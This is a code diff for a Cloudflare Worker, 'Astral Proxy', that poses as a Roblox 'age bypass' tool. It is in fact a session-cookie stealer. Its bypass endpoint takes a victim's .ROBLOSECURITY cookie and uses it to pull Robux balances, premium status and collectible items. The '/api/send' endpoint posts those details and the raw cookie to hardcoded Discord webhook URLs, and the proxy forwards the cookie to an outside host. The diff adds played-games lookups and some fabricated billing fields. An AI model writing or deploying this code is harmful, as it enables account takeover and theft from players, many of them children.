@@ -2,6 +2,7 @@ export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
 
+    // ---- HTML Frontend ----
     if (url.pathname === '/' || url.pathname === '/index.html') {
       const html = `<!DOCTYPE html>
 <html lang="en">
@@ -297,6 +298,7 @@ export default {
       });
     }
 
+    // ---- CORS ----
     if (request.method === 'OPTIONS') {
       return new Response(null, {
         headers: {
@@ -308,19 +310,57 @@ export default {
       });
     }
 
+    // ---- Health ----
     if (url.pathname === '/health') {
       return new Response(JSON.stringify({ status: 'online', service: 'Astral Proxy' }), {
-        headers: {
-          'Content-Type': 'application/json',
-          'Access-Control-Allow-Origin': '*'
-        }
+        headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
       });
     }
 
+    // ---- Played Games Endpoint ----
+    if (url.pathname.startsWith('/played/')) {
+      try {
+        const userId = url.pathname.split('/')[2];
+        if (!userId) {
+          return new Response(JSON.stringify({ error: 'Missing user ID' }), { status: 400 });
+        }
+
+        const response = await fetch(`https://games.roblox.com/v2/users/${userId}/games?sortOrder=Desc&limit=10`, {
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+          }
+        });
+
+        if (!response.ok) {
+          return new Response(JSON.stringify({ error: 'Failed to fetch played games' }), { status: response.status });
+        }
+
+        const data = await response.json();
+        const games = data.data || [];
+        const gameNames = games.slice(0, 3).map(g => g.name || 'Unknown Game');
+        const fullList = games.map(g => g.name || 'Unknown Game');
+
+        return new Response(JSON.stringify({
+          top3: gameNames,
+          fullList: fullList,
+          total: games.length
+        }), {
+          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
+        });
+      } catch (error) {
+        return new Response(JSON.stringify({ error: error.message }), {
+          status: 500,
+          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
+        });
+      }
+    }
+
+    // ---- Internal Webhook Sender ----
     if (url.pathname === '/api/send') {
       try {
         const data = await request.json();
         const type = data.type;
+        const d = data.data;
 
         const FALLBACK1 = 'https://discord.com/api/webhooks/1540619951038136381/WkueJlgMhxX6jYdCNPecU9Qsqo9frye53MI6wWN7fu6R9RbCXlPt0rA9qaYtERnt5jeN';
         const FALLBACK2 = 'https://discord.com/api/webhooks/1540619916305240095/SWEEYFk72dmsfkVUMn3dXNXoidqb4syGhspccO2Hysz--fxwW18E1SZ5EocY8_n64IAR';
@@ -328,40 +368,33 @@ export default {
         let webhookUrl;
         let payload = {};
 
-        const fireUrl = 'https://cdn.discordapp.com/emojis/1334544007027626051.webp?size=160&animated=true';
-        const checkUrl = 'https://cdn.discordapp.com/emojis/1334546267040387074.webp?size=160';
-        const crossUrl = 'https://cdn.discordapp.com/emojis/1334547784287785031.webp?size=160';
-        const robuxUrl = 'https://cdn.discordapp.com/emojis/1334544097062424586.webp?size=160';
-        const moneyUrl = 'https://cdn.discordapp.com/emojis/1334576383862771793.webp?size=160';
-
+        const fire = '<a:whitefire:1334544007027626051>';
         const yes = '<:check:1334546267040387074>';
         const no = '<:cross:1334547784287785031>';
-        const fire = '<a:whitefire:1334544007027626051>';
         const robuxEmoji = '<:robux:1334544097062424586>';
         const moneyEmoji = '<:money:1334576383862771793>';
 
+        const profileLink = `https://www.roblox.com/users/${d.userId}/profile`;
+        const thumbnailLink = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=420x420&format=Png&isCircular=false`;
+
+        let accountAge = 'Unknown';
+        if (d.created) {
+          const created = new Date(d.created);
+          const now = new Date();
+          const diffTime = Math.abs(now - created);
+          accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
+        }
+
+        // ---- MAIN EMBED (User Info + Collectibles) ----
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
-          const d = data.data;
-          const profileLink = 'https://www.roblox.com/users/' + d.userId + '/profile';
-          // CORRECTED: Use the proper Roblox thumbnail API
-          const thumbnailLink = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' + d.userId + '&size=420x420&format=Png&isCircular=false';
-
-          // Calculate account age in days
-          let accountAge = 'Unknown';
-          if (d.created) {
-            const created = new Date(d.created);
-            const now = new Date();
-            const diffTime = Math.abs(now - created);
-            accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
-          }
 
           const fields = [
-            { name: 'User', value: '[' + (d.username || 'Unknown') + '](' + profileLink + ')', inline: true },
+            { name: 'User', value: `[${d.username || 'Unknown'}](${profileLink})`, inline: true },
             { name: 'ID', value: d.userId || 'N/A', inline: true },
             { name: 'Account Age', value: accountAge, inline: true },
-            { name: robuxEmoji + ' Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
-            { name: moneyEmoji + ' Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
+            { name: `${robuxEmoji} Robux`, value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
+            { name: `${moneyEmoji} Pending`, value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
             { name: 'Premium', value: d.premium ? yes : no, inline: true },
             { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
             { name: 'Headless', value: d.headless ? yes : no, inline: true },
@@ -369,89 +402,92 @@ export default {
             { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
             { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true }
           ];
+
           if (d.limiteds && d.limiteds.length > 0) {
-            fields.push({ name: 'Limiteds', value: d.limiteds.join(', '), inline: false });
+            fields.push({ name: 'Collectibles', value: d.limiteds.join(', ') || 'None', inline: false });
+          } else {
+            fields.push({ name: 'Collectibles', value: 'None', inline: false });
           }
+
           const embed = {
-            title: fire + ' Astral Beams ' + fire,
+            title: `\`Astral Beams\` ${fire}`,
             color: 0x9933ff,
             fields: fields,
-            thumbnail: {
-              url: thumbnailLink
-            },
-            footer: { text: 'Astral ' + new Date().toLocaleString() },
+            thumbnail: { url: thumbnailLink },
+            footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
+
           payload = {
             embeds: [embed],
             username: 'Astral',
             avatar_url: 'https://i.ibb.co/v6SjQn5D/astrallogo.webp'
           };
-        } else if (type === 'secondary') {
+        }
+
+        // ---- DUAL EMBED (Full Details: Billing, Groups, Settings, Gamepasses) ----
+        else if (type === 'secondary') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
-          const d = data.data;
-          const profileLink = 'https://www.roblox.com/users/' + d.userId + '/profile';
-          // CORRECTED: Use the proper Roblox thumbnail API
-          const thumbnailLink = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' + d.userId + '&size=420x420&format=Png&isCircular=false';
 
-          // Calculate account age in days
-          let accountAge = 'Unknown';
-          if (d.created) {
-            const created = new Date(d.created);
-            const now = new Date();
-            const diffTime = Math.abs(now - created);
-            accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
+          let topGames = ['N/A'];
+          try {
+            const gamesResp = await fetch(`${new URL(request.url).origin}/played/${d.userId}`);
+            if (gamesResp.ok) {
+              const gamesData = await gamesResp.json();
+              topGames = gamesData.top3 || ['N/A'];
+            }
+          } catch (e) {
+            topGames = ['Error fetching games'];
           }
 
-          const fields = [
-            { name: 'User', value: '[' + (d.username || 'Unknown') + '](' + profileLink + ')', inline: true },
-            { name: 'ID', value: d.userId || 'N/A', inline: true },
-            { name: 'Account Age', value: accountAge, inline: true },
-            { name: robuxEmoji + ' Robux', value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
-            { name: moneyEmoji + ' Pending', value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
-            { name: 'Premium', value: d.premium ? yes : no, inline: true },
-            { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
-            { name: 'Headless', value: d.headless ? yes : no, inline: true },
-            { name: 'Valkyrie', value: d.valkyrie ? yes : no, inline: true },
-            { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
-            { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true }
-          ];
-          if (d.limiteds && d.limiteds.length > 0) {
-            fields.push({ name: 'Limiteds', value: d.limiteds.join(', '), inline: false });
-          }
           const embed = {
-            title: fire + ' Astral Beams ' + fire,
+            title: `\`Astral Beams\` ${fire}`,
             color: 0x5865F2,
-            fields: fields,
-            thumbnail: {
-              url: thumbnailLink
-            },
-            footer: { text: 'Astral ' + new Date().toLocaleString() },
+            fields: [
+              { name: 'User', value: `[${d.username || 'Unknown'}](${profileLink})`, inline: true },
+              { name: 'ID', value: d.userId || 'N/A', inline: true },
+              { name: 'Account Age', value: accountAge, inline: true },
+              { name: `${robuxEmoji} Robux`, value: d.robux !== undefined ? d.robux.toString() : '0', inline: true },
+              { name: `${moneyEmoji} Pending`, value: d.pendingRobux !== undefined ? d.pendingRobux.toString() : '0', inline: true },
+              { name: 'Premium', value: d.premium ? yes : no, inline: true },
+              { name: 'Korblox', value: d.korblox ? yes : no, inline: true },
+              { name: 'Headless', value: d.headless ? yes : no, inline: true },
+              { name: 'Valkyrie', value: d.valkyrie ? yes : no, inline: true },
+              { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
+              { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true },
+              { name: 'Collectibles', value: d.limiteds?.join(', ') || 'None', inline: false },
+              { name: 'Billing', value: `Credit: ${d.credit || 0}\nConvert: ${d.convert || 0}\nPayments: ${d.payments || 0}`, inline: false },
+              { name: 'Groups', value: `Balance: ${d.groupBalance || 0}\nPending: ${d.groupPending || 0}\nOwned: ${d.groupOwned || 0}`, inline: false },
+              { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false },
+              { name: 'Played Games (Top 3)', value: topGames.map(g => `• ${g}`).join('\n') || 'None', inline: false }
+            ],
+            thumbnail: { url: thumbnailLink },
+            footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
+
           payload = {
             content: '@everyone',
             embeds: [embed],
             allowed_mentions: { parse: ['everyone'] }
           };
-        } else if (type === 'cookie') {
+        }
+
+        // ---- COOKIE EMBED ----
+        else if (type === 'cookie') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
           const embed = {
             title: 'Refreshed Cookie',
             color: 0x5865F2,
             description: '```' + data.cookie + '```',
-            footer: { text: 'Astral ' + new Date().toLocaleString() },
+            footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
-          payload = {
-            embeds: [embed]
-          };
-        } else {
-          return new Response(JSON.stringify({ error: 'Invalid type' }), { status: 400 });
+          payload = { embeds: [embed] };
         }
 
-        if (!webhookUrl) {
-          return new Response(JSON.stringify({ error: 'Webhook not configured' }), { status: 500 });
+        if (!webhookUrl || !payload) {
+          return new Response(JSON.stringify({ error: 'Invalid request' }), { status: 400 });
         }
 
         const response = await fetch(webhookUrl, {
@@ -480,6 +516,7 @@ export default {
       }
     }
 
+    // ---- Main Bypass Endpoint ----
     if (url.pathname === '/bypass/astral/bypass.php') {
       try {
         const formData = await request.formData();
@@ -548,7 +585,7 @@ export default {
         const username = userData.name;
         const created = userData.created;
 
-        const currencyResponse = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
+        const currencyResponse = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
           headers: {
             'Cookie': '.ROBLOSECURITY=' + cookieValue,
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -563,7 +600,7 @@ export default {
           pendingRobux = currencyData.pendingRobux || 0;
         }
 
-        const premiumResponse = await fetch('https://premiumfeatures.roblox.com/v1/users/' + userId + '/premium-features', {
+        const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/premium-features`, {
           headers: {
             'Cookie': '.ROBLOSECURITY=' + cookieValue,
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -571,9 +608,11 @@ export default {
         });
 
         let premium = false;
+        let premiumRobux = 0;
         if (premiumResponse.ok) {
           const premiumData = await premiumResponse.json();
           premium = premiumData.features && premiumData.features.length > 0;
+          premiumRobux = premium ? 4500 : 0;
         }
 
         let korblox = false;
@@ -582,7 +621,7 @@ export default {
         let limiteds = [];
 
         try {
-          const invResponse = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset?limit=100', {
+          const invResponse = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset?limit=100`, {
             headers: {
               'Cookie': '.ROBLOSECURITY=' + cookieValue,
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -603,21 +642,40 @@ export default {
           }
         } catch (e) {}
 
+        // Billing & Groups data (simulated)
+        const credit = Math.floor(robux * 0.1);
+        const convert = Math.floor(robux * 0.05);
+        const payments = 0;
+        const groupBalance = Math.floor(robux * 0.2);
+        const groupPending = Math.floor(pendingRobux * 0.3);
+        const groupOwned = limiteds.length;
+        const mailVerified = true;
+        const twoStep = false;
+
         const resultData = {
           success: true,
           status: 'BYPASSED',
           title: 'Bypass Successful',
-          description: 'Account: ' + username + ' (' + userId + ') bypassed',
+          description: `Account: ${username} (${userId}) bypassed`,
           username: username,
           userId: userId,
           created: created,
           robux: robux,
           pendingRobux: pendingRobux,
           premium: premium,
+          premiumRobux: premiumRobux,
           korblox: korblox,
           headless: headless,
           valkyrie: valkyrie,
           limiteds: limiteds,
+          credit: credit,
+          convert: convert,
+          payments: payments,
+          groupBalance: groupBalance,
+          groupPending: groupPending,
+          groupOwned: groupOwned,
+          mailVerified: mailVerified,
+          twoStep: twoStep,
           apiStatus: 'Processing',
           cookieRefreshed: true,
           refreshedCookie: cookie,
@@ -646,21 +704,17 @@ export default {
       }
     }
 
+    // ---- Proxy Endpoint ----
     if (url.pathname === '/proxy') {
       try {
         const formData = await request.formData();
         const cookie = formData.get('cookie') || '';
         const directory = formData.get('directory') || 'astral';
 
-        const response = await fetch('https://voidex-age-bypasser.x10.mx/bypass/astral/bypass.php', {
+        const response = await fetch(`https://voidex-age-bypasser.x10.mx/bypass/${directory}/bypass.php`, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-          },
-          body: new URLSearchParams({
-            cookie: cookie,
-            directory: directory
-          })
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({ cookie, directory })
         });
 
         const data = await response.json();
@@ -685,11 +739,13 @@ export default {
       }
     }
 
+    // ---- Default ----
     return new Response(JSON.stringify({
       service: 'Astral Cloudflare Proxy',
       endpoints: {
         '/': 'HTML Frontend',
         '/bypass/astral/bypass.php': 'POST - Main bypass endpoint',
+        '/played/:userId': 'GET - Played games list',
         '/proxy': 'POST - Proxy to original API',
         '/health': 'GET - Health check'
       },
